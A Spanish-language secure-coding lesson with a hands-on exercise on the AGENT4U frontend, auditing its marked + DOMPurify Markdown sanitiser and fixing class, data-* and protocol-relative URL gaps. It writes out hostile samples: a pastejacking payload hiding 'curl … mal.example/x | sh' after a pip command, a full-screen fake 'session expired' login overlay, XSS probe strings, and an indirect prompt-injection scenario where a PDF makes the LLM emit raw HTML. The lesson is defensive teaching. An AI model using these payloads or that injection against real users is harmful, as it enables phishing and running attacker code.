# Píldora 14 — Markdown seguro: marked + DOMPurify

**Domingo 15-nov-2026 · sesión larga: 30 min de lectura + 2 h de ejercicio**

## 0. Crítica de la entrega del día 13

No hay entrega del día 13: en `origin/aprendizaje` no existe `entregas/dia-13.md` y en el remoto no hay ninguna rama `ejercicio/dia-*`. Tampoco ha llegado tarde ninguna de las anteriores. Sin nota.

El ejercicio del 13 (traducir el corte del stream a `ErrorApi`) sigue valiendo tal cual: `preguntar.ts` no ha cambiado. Si lo retomas, súbelo en su rama y lo critico en la próxima.

**`main` se ha movido.** Desde la píldora 13 ha entrado `#44` (*contenido y visor*, 13-nov, `5b7620a`). Es un cambio grande, 43 ficheros y +2.193 líneas, y toca de lleno el tema de hoy:

- El backend guarda ahora el Markdown completo de cada documento (`services/contenidos.py`) y lo sirve en `GET /documentos/{id}/contenido`. El gateway lo expone como `contenido_documento(id)`.
- El frontend tiene una pantalla nueva, `/app/documentos/:id` (`features/visor/VisorDocumento.tsx`), que **pinta ese Markdown con el mismo `markdownAHtml` que el chat**.
- `markdown.ts` estrena su primer test (`markdown.test.ts`, 5 casos).

O sea: `markdownAHtml` ya no sanea solo lo que escribe el LLM, también **el texto de cualquier documento que alguien suba**. El plan decía "Markdown seguro" con un solo consumidor; hoy hay dos, y los trato a los dos.

Todo lo que cuento lo he comprobado hoy contra `5b7620a`: `npx vitest run` da **13 ficheros, 107 tests** en verde. He hecho el ejercicio entero en Chromium antes de escribirlo, y las salidas que pego son reales.

---

## 1. Concepto clave: convertir texto en HTML sin regalar tu página

### 1.1 Por qué hace falta `dangerouslySetInnerHTML`

React escapa todo lo que metes entre llaves: `<p>{texto}</p>` con `texto = '<b>hola</b>'` pinta literalmente `<b>hola</b>`. Es la razón por la que React es seguro por defecto.

Pero una respuesta del modelo **es** Markdown: `## Título`, listas, tablas, bloques de código. Para verlo formateado hay dos caminos:

1. **Construir elementos de React** a partir del árbol del Markdown. Es lo que hace `react-markdown`: nunca toca `innerHTML`, y por defecto ignora el HTML crudo que venga en el texto.
2. **Generar una cadena HTML** y meterla con `dangerouslySetInnerHTML={{ __html: html }}`. El nombre ya avisa: React deja de protegerte, y lo que haya en esa cadena se convierte en DOM tal cual.

AGENT4U usa el segundo. Eso obliga a que la cadena pase antes por un **saneador**.

### 1.2 Los tres eslabones

```text
texto (LLM o documento)  ──marked──▶  HTML crudo  ──DOMPurify──▶  HTML limpio  ──rematar──▶  HTML final  ──▶  innerHTML
```

- **`marked`** es un parser de Markdown a HTML. **No sanea nada**: si el texto trae `<script>`, el HTML lo trae. Así lo dice su propia documentación ("marked does not sanitize the output HTML").
- **DOMPurify** recibe HTML, lo parsea con el **parser real del navegador** (no con regex) y recorre el árbol borrando todo lo que no esté permitido. Que use el parser del navegador es lo que lo hace fiable: ve el HTML exactamente como lo verá el navegador después.
- **El orden importa.** Sanear antes de `marked` no sirve, porque el Markdown puede *generar* HTML peligroso que no estaba en el texto (`[a](javascript:alert(1))` no contiene ninguna etiqueta y acaba siendo un `<a href="javascript:...">`).

### 1.3 Lista blanca, y lo que se olvida al hacerla

Hay dos maneras de sanear: **lista negra** (quito lo malo conocido: `script`, `onerror`…) o **lista blanca** (solo dejo lo que sé que necesito). La lista negra siempre pierde, porque el atacante solo necesita una cosa que tú no conocías. AGENT4U usa lista blanca, que es lo correcto.

Pero hay un matiz que vas a comprobar hoy: **XSS no es el único daño**. Aunque no se ejecute ni una línea de JavaScript, el HTML que dejas pasar puede:

- **Disfrazarse de tu interfaz.** Si el texto puede usar las clases CSS de tu app, puede tapar la pantalla con un "tu sesión ha caducado, entra aquí" (*UI redressing*).
- **Esconder texto.** Lo que el usuario ve no es lo que copia (*pastejacking*).
- **Hacerse pasar por tus controles.** Si tu app reconoce sus botones por un atributo `data-*`, el texto puede fabricar uno.

Con Tailwind esto se agrava: toda la librería de utilidades (`fixed`, `inset-0`, `hidden`, `z-30`…) está cargada en la página y lista para que cualquier `class="..."` la use.

---

## 2. Cómo está en AGENT4U

### 2.1 El mapa

```text
frontend/src/shared/lib/markdown.ts     225 l.  markdownAHtml(texto, fuentes) → string
  ├─ marked.use({ gfm, breaks })          l. 6-11
  ├─ ETIQUETAS (26) y ATRIBUTOS (8)       l. 20-58    lista blanca
  ├─ markdownAHtml                        l. 68-79    parse → sanitize → rematar
  ├─ rematar                              l. 88-110   target/rel en enlaces + botón "Copiar"
  ├─ marcarCitas                          l. 123-161  [n] → botón de cita
  └─ crearCita                            l. 180-225  botón + popover de CSS puro

Consumidores (los dos únicos dangerouslySetInnerHTML de src/):
  features/chat/Respuesta.tsx:30,85             respuesta del LLM, re-parseada en cada token
  features/visor/VisorDocumento.tsx:420-423,444 Markdown de Docling, por secciones
```

### 2.2 `markdownAHtml`: el núcleo

```ts
// src/shared/lib/markdown.ts:68-79
export function markdownAHtml(texto: string, fuentes: Fuente[] = []): string {
  const crudo = marked.parse(texto, { async: false });

  const limpio = DOMPurify.sanitize(crudo, {
    ALLOWED_TAGS: ETIQUETAS,
    ALLOWED_ATTR: ATRIBUTOS,
    // Sin `javascript:` ni `data:` en los href, aunque DOMPurify ya los filtra.
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
  });

  return rematar(limpio, fuentes);
}
```

- **`ETIQUETAS`** (l. 20-47): `p br hr strong em del code pre blockquote ul ol li h1-h6 a table thead tbody tr th td span`. Fuera quedan, entre otras, `img` (decisión explícita, l. 16-18: una imagen remota es una petición a un tercero desde la página del usuario, es decir, un píxel espía), `iframe`, `form`, `input`, `style` y `script`.
- **`ATRIBUTOS`** (l. 49-58): `href title lang class start align colspan rowspan`. Ningún `on*` ni `style`.
- **`ALLOWED_URI_REGEXP`**: solo `http(s):`, `mailto:`, anclas `#` y rutas que empiezan por `/`.
- **`marked.use`** (l. 6-11) configura el `marked` **global** del módulo: `gfm` (tablas, tachado) y `breaks: true`, porque los modelos escriben saltos de línea sueltos y sin eso "media respuesta se ve como un párrafo corrido".

### 2.3 `rematar`: lo que se añade después de sanear

```ts
// src/shared/lib/markdown.ts:88-110 (resumido)
function rematar(html: string, fuentes: Fuente[]): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  for (const enlace of doc.querySelectorAll('a[href]')) {
    enlace.setAttribute('target', '_blank');
    enlace.setAttribute('rel', 'noopener noreferrer');   // la pestaña nueva no toca window.opener
  }
  for (const bloque of doc.querySelectorAll('pre')) {
    const boton = doc.createElement('button');
    boton.className = 'copiar-codigo';
    boton.textContent = 'Copiar';
    boton.setAttribute('data-copiar-codigo', '');
    bloque.insertBefore(boton, bloque.firstChild);
  }
  marcarCitas(doc, fuentes);
  return doc.body.innerHTML;
}
```

La idea es buena y está bien explicada en el comentario (l. 85-86): **los botones se crean después de sanear**, con `createElement` y `textContent`, "para que sea marcado nuestro y no algo que el modelo pueda falsificar". `button` no está en `ETIQUETAS`, así que el modelo no puede escribir un `<button>`.

Dos detalles finos:

- **`DOMParser` no ejecuta nada.** Un documento creado con `parseFromString` es inerte: sus `<script>` no corren y sus imágenes no se descargan. Por eso es seguro usarlo como mesa de trabajo.
- **`marcarCitas` trabaja sobre nodos de texto** (l. 127-137, con un `TreeWalker`), nunca sobre la cadena HTML. Se salta lo que esté dentro de `pre`, `code` o `a`, y solo convierte `[n]` si existe la fuente `n` (l. 147). Una cita inventada, como `[7]` con 2 fuentes, se queda como texto, para que se note.

### 2.4 Los dos consumidores

**Chat (`Respuesta.tsx`).** El texto llega token a token por el SSE (día 13), y cada token cambia `texto`:

```tsx
// src/features/chat/Respuesta.tsx:28-30
// Re-parsear en cada chunk del stream seria tirar trabajo: se memoiza por
// texto y por fuentes, que es lo unico que cambia el resultado.
const html = useMemo(() => markdownAHtml(texto, fuentes), [texto, fuentes]);
```

Los botones viven dentro del HTML inyectado, así que no pueden tener `onClick` de React. Todo va **por delegación** desde el `<div>` padre (l. 33-68): `closest('[data-cita]')` para las citas y `closest('[data-copiar-codigo]')` para copiar. Guárdate esto: **la app decide qué es un botón suyo mirando un atributo `data-*`**.

El componente va envuelto en `memo` (l. 100), y el comentario de las l. 90-99 cuenta por qué: sin él, pasar el ratón por una cita re-renderizaba, React reescribía el `innerHTML` y el botón desaparecía entre el `mousedown` y el `click`.

`Mensaje.tsx:12` lo carga con `lazy()`: "`marked` y `dompurify` son 74 kB". Lo he medido con `vite build`: el chunk `markdown-*.js` pesa **75,5 kB (25,4 kB gzip)**, y Vite lo comparte entre `Respuesta` y `VisorDocumento`. El comentario es correcto. Mientras carga, el `Suspense` (`Mensaje.tsx:59`) pinta el texto plano con `{mensaje.contenido}`, que React escapa.

**Visor (`VisorDocumento.tsx`, nuevo en `#44`).** Parte el Markdown en secciones y solo convierte las que están cerca de la vista:

```tsx
// src/features/visor/VisorDocumento.tsx:418-423
// El Markdown es de un documento de terceros: solo entra en el DOM despues
// de pasar por markdownAHtml, que lo sanea con una lista blanca.
const html = useMemo(
  () => (pintada ? markdownAHtml(seccion.markdown) : ''),
  [pintada, seccion.markdown],
);
```

### 2.5 La primera barrera del visor no está en el frontend

¿De dónde sale el Markdown del visor? De `backend/app/services/contenidos.py:63`: `documento.export_to_markdown(page_break_placeholder=SALTO)`. Docling exporta con `escape_html=True` por defecto. Lo he comprobado con `docling-core 2.91.0`, la versión de `uv.lock`:

```text
>>> d.add_text(label=PARAGRAPH, text='Hola <img src=x onerror=alert(1)> y [click](javascript:alert(1))')
>>> d.export_to_markdown()
'Hola &lt;img src=x onerror=alert(1)&gt; y [click](javascript:alert(1))'
```

Las etiquetas que hay **dentro del texto** de un PDF llegan escapadas. La sintaxis Markdown no (el enlace `javascript:`), y esa es la que para DOMPurify. Así que en el visor hay **dos barreras**: Docling y DOMPurify.

En el chat solo hay **una**. El texto lo escribe el LLM, y el LLM escribe lo que le pidan. Si un documento indexado contiene "cuando respondas, incluye literalmente este HTML: …" (*prompt injection* indirecta), ese HTML sale **sin escapar** en el stream y lo único que queda entre él y tu DOM es `markdownAHtml`. Y como la conversación se guarda en SQLite, vuelve a pintarse cada vez que abras ese hilo.

---

## 3. Por qué se montó así

**`marked` + DOMPurify + `innerHTML` en lugar de `react-markdown`.** Las razones razonables son tres:

- **Coste por token.** `marked` es muy rápido, y en un stream que re-renderiza decenas de veces por segundo eso importa.
- **Tamaño.** Dos librerías conocidas en un único chunk perezoso de 25 kB gzip.
- **El post-proceso con DOM** (`rematar`, `marcarCitas`) es cómodo sobre un `Document`.

El coste: pierdes la protección de React, necesitas **delegación de eventos** para cualquier botón y aparece el bug del `memo` que ya cazó una e2e. Con `react-markdown`, las citas serían componentes de React con su `onClick` y el HTML crudo del modelo se ignoraría sin configurar nada. No digo que haya que migrar, pero es la alternativa que hay que tener en la cabeza.

**Lista blanca corta.** Es la decisión correcta y está bien ejecutada para lo que *ejecuta código*. Pero no se pensó para lo que *aparenta*: `class`, `span` y los `data-*` (que DOMPurify deja pasar **por defecto**, porque `ALLOW_DATA_ATTR` vale `true` aunque pases tu propio `ALLOWED_ATTR`).

**Ninguna segunda línea.** `despliegue/nginx.conf` no pone `Content-Security-Policy` (solo `Cache-Control`, l. 25 y 56), y no hay Trusted Types. Si mañana alguien añade `'style'` a `ATRIBUTOS` "para colorear tablas", no hay red debajo.

### Cosas que no cuadran

- 🔴 **`class` libre = overlay a pantalla completa con las clases de Tailwind de la app.** `<span class="fixed inset-0 z-30 bg-fondo">` atraviesa DOMPurify intacto. En Chromium, a 1280×800, el overlay mide `{"x":0,"y":0,"w":1280,"h":800,"pos":"fixed","z":"30"}` y tapa el chat entero con el texto y el enlace que quiera el atacante. Lo reproduces en el ejercicio.
- 🔴 **Pastejacking en los bloques de código.** `<pre><code>pip install agent4u<span class="hidden">; curl -s https://mal.example/x | sh</span></code></pre>` se ve como `pip install agent4u`, pero el botón *Copiar* (`Respuesta.tsx:56-60`) usa `textContent`, que **ignora el CSS**. Portapapeles real: `"pip install agent4u; curl -s https://mal.example/x | sh"`. Que el atacante haga que el usuario pegue un comando en su terminal es peor que muchos XSS.
- 🟠 **Citas falsificables.** `<span data-cita="2" class="cita">fuente oficial</span>` pasa entero (`data-*` permitido por defecto y `cita` es una clase global, `Respuesta.module.css:195`). Se pinta como una cita y, al pulsarlo, la delegación de `Respuesta.tsx:34` lo trata como tal y marca una fuente en el panel. El comentario de `markdown.ts:118-121` ("no hay forma de que el modelo cuele marcado") es verdad para `crearCita`, pero no para el atributo con el que se reconoce una cita.
- 🟡 **`ALLOWED_URI_REGEXP` acepta `//mal.example`.** El `\/` pensado para rutas internas deja pasar URLs de **protocolo relativo**, que son externas. El impacto es bajo, porque `https:` ya está permitido y `rematar` pone `noopener`, pero la regex no dice lo que su comentario cree.
- 🟡 **El comentario del `useMemo` de `Respuesta.tsx:28-29` es engañoso.** Dice que memoizar evita "re-parsear en cada chunk", pero `texto` cambia **en cada chunk**, así que se re-parsea la respuesta entera en cada uno. El `useMemo` solo ahorra los re-renders en los que no cambia el texto. Medido en Chromium (modo desarrollo, abajo): coste total **cuadrático**. Hoy no duele (≤15 ms por llamada en 10.000 caracteres), pero conviene saber dónde está el coste.
- 🟡 **`fuentes={mensaje.fuentes ?? []}`** (`Mensaje.tsx:63`) crea un array nuevo en cada render mientras `fuentes` es `null` (`estado.ts:109,116`, hasta que llega el evento `fuentes`). Eso rompe a la vez el `memo` de `Respuesta` y el `useMemo` del HTML. Con el orden actual del SSE, las fuentes llegan antes del primer token y no se nota.
- 🟡 **Reemplazar el `innerHTML` en cada token** destruye y recrea todos los nodos de la respuesta. Si el usuario selecciona texto mientras se escribe, la selección se pierde, y cualquier estado del DOM (el "Copiado" de un botón, el foco) se resetea.

---

## 4. Ejercicio (sesión larga, ~2 h 15 min)

Rama `ejercicio/dia-14` desde `main`. Objetivo: atacar tu propio saneador **desde el navegador**, demostrar los tres agujeros con tests en rojo, cerrarlos y medir lo que cuesta re-parsear en cada token.

No necesitas backend ni gateway: usarás una copia del **servidor falso** de las e2e con una respuesta hostil.

### Paso 1 — Rama e instalación (5 min)

```bash
cd ~/ruta/AGENT4U
git fetch origin
git switch -c ejercicio/dia-14 origin/main
cd frontend
npm ci
npx vitest run                # esperado: Test Files 13 passed · Tests 107 passed
```

### Paso 2 — Predice antes de ejecutar (25 min)

Antes de ejecutar nada, escribe en tu entrega, para cada uno de estos 9 textos, **qué HTML crees que devuelve `markdownAHtml`** (con una fuente cargada). Solo después, ejecuta la sonda.

Crea `src/sonda/sonda.test.ts` (no se sube):

```ts
import { writeFileSync } from 'node:fs';

import { it } from 'vitest';

import type { Fuente } from '@/shared/api/types';
import { markdownAHtml } from '@/shared/lib/markdown';

const fuentes: Fuente[] = [
  { nombre: 'a.pdf', origen: '/subidas/a.pdf', headings: ['Intro'], paginas: [3], texto: 'frag' },
];

const casos: [string, string][] = [
  ['1 script', '**hola** <script>alert(1)</script>'],
  ['2 img', '<img src=x onerror=alert(1)>'],
  ['3 javascript:', '[a](javascript:alert(1))'],
  ['4 //dominio', '[a](//mal.example/x)'],
  ['5 overlay', '<span class="fixed inset-0 z-30 bg-fondo">x</span>'],
  ['6 data-cita', '<span data-cita="1">x</span>'],
  ['7 form', '<form action="https://mal.example"><input name=p></form>'],
  ['8 citas', 'Según [1] y [7].'],
  ['9 código', '~~~html\n<script>alert(1)</script>\n~~~'],
];

it('sonda', () => {
  const salida = casos
    .map(([nombre, md]) => `${nombre}\n  ENTRA: ${md}\n  SALE:  ${markdownAHtml(md, fuentes)}`)
    .join('\n\n');
  writeFileSync('/tmp/sonda.txt', salida);
});
```

```bash
npx vitest run src/sonda
cat /tmp/sonda.txt
rm -rf src/sonda              # la sonda no se sube
```

Escribe en la entrega una tabla con tres columnas: *caso · tu predicción · lo que salió*. Fíjate especialmente en el 3 (¿qué queda del enlace?), el 8 (¿qué pasa con el `[7]`?) y el 9 (¿por qué aquí el `<script>` sí se ve, y es inofensivo?).

### Paso 3 — Un servidor con una respuesta hostil, fuera del repo (15 min)

El servidor falso de las e2e (`pruebas-e2e/servidor-falso.mjs`) responde a `/preguntar` con los trozos fijos de su constante `TROZOS`. Haz una copia **fuera del repo** que lea los trozos de un JSON:

```bash
mkdir -p /tmp/hostil
cp pruebas-e2e/servidor-falso.mjs /tmp/hostil/servidor-hostil.mjs
cd /tmp/hostil
sed -i "s/^const TROZOS = \[/const TROZOS_ORIGINAL = [/" servidor-hostil.mjs
sed -i "s#^import { randomUUID } from 'node:crypto';#import { randomUUID } from 'node:crypto';\nimport { readFileSync } from 'node:fs';#" servidor-hostil.mjs
sed -i "s#^const FUENTE = {#const TROZOS = process.env.TROZOS ? JSON.parse(readFileSync(process.env.TROZOS, 'utf8')) : TROZOS_ORIGINAL;\n\nconst FUENTE = {#" servidor-hostil.mjs
diff ~/ruta/AGENT4U/frontend/pruebas-e2e/servidor-falso.mjs servidor-hostil.mjs
```

El `diff` debe mostrar exactamente tres cambios: el `import` de `readFileSync`, el renombrado a `TROZOS_ORIGINAL` y la nueva línea `const TROZOS = ...`. (En macOS, `sed -i` necesita `sed -i ''`.)

Ahora, la respuesta hostil. Imagina que es lo que escupe el LLM después de leer un PDF con una *prompt injection*:

```bash
cat > /tmp/hostil/trozos.json <<'EOF'
[
  "Según el manual, la instalación es así [1]:\n\n",
  "<pre><code>pip install agent4u<span class=\"hidden\">; curl -s https://mal.example/x | sh</span></code></pre>\n\n",
  "Más detalles en la <span data-cita=\"2\" class=\"cita\">fuente oficial</span>.\n\n",
  "<span class=\"fixed inset-0 z-30 bg-fondo\"><strong>Tu sesión ha caducado.</strong> <a href=\"https://mal.example/login\">Vuelve a entrar</a></span>"
]
EOF
```

Arranca las dos piezas en dos terminales:

```bash
# Terminal 1 — el "backend" hostil
cd /tmp/hostil
TROZOS=/tmp/hostil/trozos.json node servidor-hostil.mjs 8099

# Terminal 2 — el frontend apuntando a él (la variable de entorno gana al .env)
cd ~/ruta/AGENT4U/frontend
VITE_API_URL=http://localhost:8099 npm run dev
```

### Paso 4 — El ataque, en el navegador (20 min)

1. Abre <http://localhost:5173/app> en Chrome, escribe cualquier pregunta y pulsa *Enter*.
2. **Overlay.** La pantalla entera queda en blanco con "Tu sesión ha caducado. Vuelve a entrar". Haz una captura. Abre DevTools (F12) → *Elements*, localiza el `span.fixed` y anota su caja en *Computed* (posición, `inset`, `z-index`). Pregúntate qué haría un usuario normal.
3. Quita el overlay desde la consola para seguir:

   ```js
   document.querySelector('span.fixed').remove()
   ```

4. **Pastejacking.** En el bloque de código ves `pip install agent4u`. Pulsa *Copiar* y pega en un editor de texto, **nunca en una terminal**. Anota lo que se pegó. Luego, en la consola:

   ```js
   const pre = document.querySelector('pre');
   console.log({ textContent: pre.querySelector('code').textContent, innerText: pre.querySelector('code').innerText });
   ```

   Anota la diferencia entre las dos propiedades.
5. **Cita falsa.** Pulsa "fuente oficial" y mira qué pasa en el panel de fuentes. Compárala en *Elements* con la cita legítima `1` del primer párrafo: ¿qué tiene la verdadera que no tenga la falsa?

Para mi referencia, en Chromium obtuve: overlay de `1280×800` en `(0,0)` con `z-index: 30`, `display: none` en el `span.hidden` y el portapapeles con `"pip install agent4u; curl -s https://mal.example/x | sh"`.

Deja los dos servidores arrancados: los vuelves a usar en el Paso 7.

### Paso 5 — Primero los tests, en rojo (20 min)

Añade **al final** de `src/shared/lib/markdown.test.ts`. Añade también el `import type` arriba, junto al otro `import`:

```ts
import type { Fuente } from '@/shared/api/types';
```

```ts
/**
 * Lo que DOMPurify deja pasar con esta configuración y que no hace falta un
 * `<script>` para explotar: basta con el CSS de la propia app.
 */
describe('markdownAHtml no deja que el texto se haga pasar por la interfaz', () => {
  const fuentes: Fuente[] = [
    { nombre: 'a.pdf', origen: '/subidas/a.pdf', headings: [], paginas: [1], texto: 't' },
  ];

  it('quita las clases arbitrarias: nada de overlays con Tailwind', () => {
    const html = markdownAHtml(
      '<span class="fixed inset-0 z-30 bg-fondo">Tu sesión ha caducado</span>',
    );
    expect(html).not.toMatch(/class="[^"]*fixed/);
  });

  it('no deja texto oculto dentro de un bloque de código (pastejacking)', () => {
    const html = markdownAHtml(
      '<pre><code>pip install x<span class="hidden">; curl mal.example|sh</span></code></pre>',
    );
    expect(html).not.toContain('class="hidden"');
  });

  it('conserva la clase de lenguaje que marked pone en los bloques de código', () => {
    expect(markdownAHtml('~~~python\nprint(1)\n~~~')).toContain(
      'class="language-python"',
    );
  });

  it('no deja atributos data-*: una cita falsa no es pulsable', () => {
    const html = markdownAHtml('Mira <span data-cita="1">aquí</span>', fuentes);
    expect(html).not.toContain('data-cita');
  });

  it('no deja enlaces de protocolo relativo (//otro-dominio)', () => {
    expect(markdownAHtml('[docs](//mal.example/x)')).not.toContain('href="//');
  });
});
```

```bash
npx vitest run src/shared/lib/markdown.test.ts
```

Esperado: **`Tests 4 failed | 6 passed (10)`**. El de `language-python` pasa ya: es la **guarda** para que tu arreglo no rompa el resaltado de los bloques de código. Pega la salida en la entrega.

### Paso 6 — El arreglo (15 min)

En `src/shared/lib/markdown.ts`, **justo encima** del comentario de `markdownAHtml` (antes de la línea `/** Convierte el markdown del modelo en HTML seguro.`), añade:

```ts
/**
 * La unica clase que se acepta del texto: la que marked pone en los bloques de
 * codigo con lenguaje (class="language-python"). Cualquier otra seria CSS de
 * la propia app al servicio del texto: `fixed inset-0` tapa la pantalla y
 * `hidden` esconde lo que luego se copia.
 */
const CLASE_PERMITIDA = /^language-[\w+-]+$/;

DOMPurify.addHook('uponSanitizeAttribute', (_nodo, datos) => {
  if (datos.attrName === 'class' && !CLASE_PERMITIDA.test(datos.attrValue)) {
    datos.keepAttr = false;
  }
});
```

Y en la llamada a `DOMPurify.sanitize`, sustituye la línea del `ALLOWED_URI_REGEXP` por:

```ts
    // `/` solo si no le sigue otra: `//otro.dominio` es un enlace externo.
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/(?!\/))/i,
    // Por defecto DOMPurify deja pasar cualquier `data-*`, y la app usa
    // `data-cita` y `data-copiar-codigo` para sus propios botones.
    ALLOW_DATA_ATTR: false,
```

Por qué así:

- **Un *hook* y no quitar `class` de `ATRIBUTOS`.** Si quitas `class`, pierdes `language-python`, que marked pone en los bloques de código con lenguaje. El hook `uponSanitizeAttribute` se ejecuta para cada atributo y te deja decidir por **valor**, no solo por nombre.
- **Las clases propias no se ven afectadas**, porque `rematar` las añade **después** de sanear. Es el mismo principio que ya usaba el código para los botones.
- **El hook es global** a la instancia por defecto de DOMPurify. Hoy solo la usa este módulo. Si mañana hubiera otro consumidor con otras reglas, tocaría crear una instancia propia.

```bash
npx vitest run                # esperado: Test Files 13 passed · Tests 112 passed
npm run typecheck
npm run lint
npx prettier --check src      # si se queja: npx prettier --write src/shared/lib y vuelve a comprobar
```

### Paso 7 — Vuelve a atacar (10 min)

Con los dos servidores aún arrancados (Vite recarga solo), repite la pregunta en <http://localhost:5173/app>:

- El overlay ya no tapa nada: el texto "Tu sesión ha caducado" queda como una línea más de la respuesta.
- La cola `; curl …` del bloque de código **se ve**. Ya no hay engaño: el usuario ve lo que copia.
- "fuente oficial" es texto normal y no hace nada al pulsarlo.

Comprueba en la consola que no queda nada:

```js
[...document.querySelectorAll('span.fixed, pre span.hidden, span[data-cita]')].length   // esperado: 0
```

Haz una captura del después.

### Paso 8 — Mide lo que cuesta re-parsear en cada token (15 min)

Con el servidor de desarrollo en marcha, abre <http://localhost:5173/app>, DevTools → *Console*, y pega esto. Vite sirve el módulo TypeScript tal cual, así que puedes importarlo:

```js
const { markdownAHtml } = await import('/src/shared/lib/markdown.ts');
const f = [{ nombre: 'a.pdf', origen: '/a', headings: ['T'], paginas: [1], texto: 'x' }];
const base = 'El reranking reordena **los fragmentos** según la pregunta [1]. ';
const filas = [];
for (const n of [300, 1000, 2000]) {
  let texto = '';
  let max = 0;
  const t0 = performance.now();
  for (let i = 0; i < n; i++) {
    texto += i % 30 === 0 ? '\n\n- ' : base.slice((i * 7) % 40, (i * 7) % 40 + 5);
    const a = performance.now();
    markdownAHtml(texto, f);
    max = Math.max(max, performance.now() - a);
  }
  filas.push({ trozos: n, caracteres: texto.length, total_ms: Math.round(performance.now() - t0), max_por_trozo_ms: +max.toFixed(1) });
}
console.table(filas);
```

Simula un stream de `n` trozos de ~5 caracteres y llama a `markdownAHtml` con el texto acumulado, igual que hace `Respuesta` en cada token. Mis números en Chromium headless:

```text
trozos   caracteres   total_ms    max_por_trozo_ms
  300       1.490      175-183        5,6-8,5
 1000       4.966    1.222-1.425     11,8-14,6
 2000       9.933    3.879-4.310     10,9-13,5
```

Pega los tuyos. Fíjate en que doblar la longitud **casi triplica** el total: cada token re-parsea todo lo anterior.

Al terminar, para los servidores con *Ctrl+C* en las dos terminales.

### Paso 9 — Commit y push (5 min)

```bash
cd ~/ruta/AGENT4U
git status --short            # solo los dos ficheros de markdown
git add frontend/src/shared/lib/markdown.ts frontend/src/shared/lib/markdown.test.ts
git commit -m "fix(frontend): cerrar class, data-* y // en el saneado de markdown"
git push -u origin ejercicio/dia-14
```

### Preguntas (responde con tus palabras)

1. Explica por qué el orden es `marked` → DOMPurify y no al revés. Pon un ejemplo **concreto** de texto sin ninguna etiqueta HTML que, saneado antes de `marked`, acabaría siendo peligroso.
2. En el caso 3 de la sonda, ¿qué queda del enlace y por qué? ¿Lo para `ALLOWED_URI_REGEXP` o lo habría parado DOMPurify igualmente? ¿Por qué `rematar` no le pone `target="_blank"`?
3. ¿Por qué el visor tiene dos barreras y el chat una? Describe paso a paso cómo un PDF subido por un tercero podría acabar pintando el overlay **en el chat** de otro usuario, y dónde se guarda para que reaparezca.
4. Ninguno de los tres agujeros de hoy ejecuta JavaScript. ¿Por qué siguen siendo de seguridad? Ordénalos por gravedad y justifícalo.
5. ¿Por qué el arreglo de `class` es un *hook* por valor y no quitar `class` de `ATRIBUTOS`? ¿Por qué no afecta a `copiar-codigo`, `cita` ni `cita-popover`?
6. Tras el arreglo, el botón *Copiar* sigue usando `textContent`. ¿Hay que cambiarlo a `innerText`? Da un argumento a favor y otro en contra (piensa en qué hace `innerText` con el CSS y con los saltos de línea).
7. Con tus números del Paso 8: ¿el comentario de `Respuesta.tsx:28-29` es correcto? ¿Qué evita de verdad el `useMemo`, y qué evita el `memo` de la línea 100? Propón **una** forma de reducir el coste (por ejemplo `useDeferredValue(texto)`, o re-parsear como mucho una vez por fotograma) y di qué perderías con ella.
8. Sin CSP, ¿qué pasaría si mañana alguien añade `'style'` a `ATRIBUTOS`? Escribe la cabecera `Content-Security-Policy` mínima que pondrías en `despliegue/nginx.conf` para este frontend, y di qué directiva frena qué cosa.

### Criterios de aceptación

- [ ] Rama `ejercicio/dia-14` creada desde `main` y subida, con un único commit que solo toca `frontend/src/shared/lib/markdown.ts` y `frontend/src/shared/lib/markdown.test.ts`.
- [ ] La tabla *caso · predicción · salida* de los 9 casos del Paso 2, con tus predicciones escritas **antes** de ejecutar.
- [ ] La captura del overlay (Paso 4), el texto pegado del portapapeles y la diferencia `textContent`/`innerText`.
- [ ] La salida en **rojo** del Paso 5 (`4 failed | 6 passed`).
- [ ] `npx vitest run` con 13 ficheros y 112 tests en verde; `npm run typecheck`, `npm run lint` y `npx prettier --check src` limpios.
- [ ] La captura del después y el `0` de la consola (Paso 7).
- [ ] Tu tabla de tiempos del Paso 8.
- [ ] `src/sonda/` y `/tmp/hostil` fuera del commit.
- [ ] Las 8 preguntas respondidas con tus palabras.
- [ ] Párrafo para `ARCHITECTURE.md` al final de la entrega.

**Bonus (opcional, 30-45 min):** elige uno.

- **(a) CSP.** Añade a `despliegue/nginx.conf` la cabecera de tu pregunta 8, construye la imagen del frontend y comprueba en *Console* que no rompe nada (fuentes, estilos, el `fetch` al gateway). En un segundo commit.
- **(b) Menos re-parseo.** En `Respuesta.tsx`, usa `const textoDiferido = useDeferredValue(texto)` y pasa `textoDiferido` al `useMemo`. Mide con el *Performance* de DevTools una respuesta larga antes y después (cuenta las llamadas a `markdownAHtml` con un `console.count` temporal), y explica el resultado. Corrige también el comentario de las l. 28-29 para que diga la verdad.

Entrega antes de las **8:30 del martes 17-nov**:

```bash
git fetch origin && git switch aprendizaje && git pull
cp docs/aprendizaje/entregas/PLANTILLA.md docs/aprendizaje/entregas/dia-14.md
# ...rellena dia-14.md: tabla de la sonda, capturas, salidas, tiempos, respuestas y párrafo...
git add docs/aprendizaje/entregas/dia-14.md
git commit -m "entrega día 14" && git push
```

Si quieres feedback antes, pega `docs/aprendizaje/PROMPT_REVISION.md` en Claude Code y te revisa la entrega y la rama al momento.

---

## 5. Para profundizar (opcional)

- DOMPurify, README (configuración: `ALLOWED_TAGS`, `ALLOWED_ATTR`, `ALLOW_DATA_ATTR`, `ALLOWED_URI_REGEXP` y los *hooks*): <https://github.com/cure53/DOMPurify#can-i-configure-dompurify>
- OWASP, *Cross Site Scripting Prevention Cheat Sheet* (por qué sanear HTML, y la CSP como segunda línea): <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

---

## 6. Aportación a `ARCHITECTURE.md`

Tu párrafo para la sección *11. Frontend: cliente de API y flujos* debería cubrir:

- El recorrido `marked` → DOMPurify → `rematar` → `dangerouslySetInnerHTML`, por qué en ese orden, y que los dos únicos consumidores son `Respuesta` (chat, en cada token) y `BloqueSeccion` del visor (por secciones, al acercarse a la vista).
- La lista blanca (sin `img`, sin `on*`, sin `style`) y el principio de `rematar`: lo que es marcado propio (botones de copiar y citas) se añade **después** de sanear, y se reconoce por `data-*` mediante delegación de eventos.
- Las dos barreras del visor (Docling exporta con `escape_html` + DOMPurify) frente a la única del chat, y por qué el chat es el camino de una *prompt injection*.
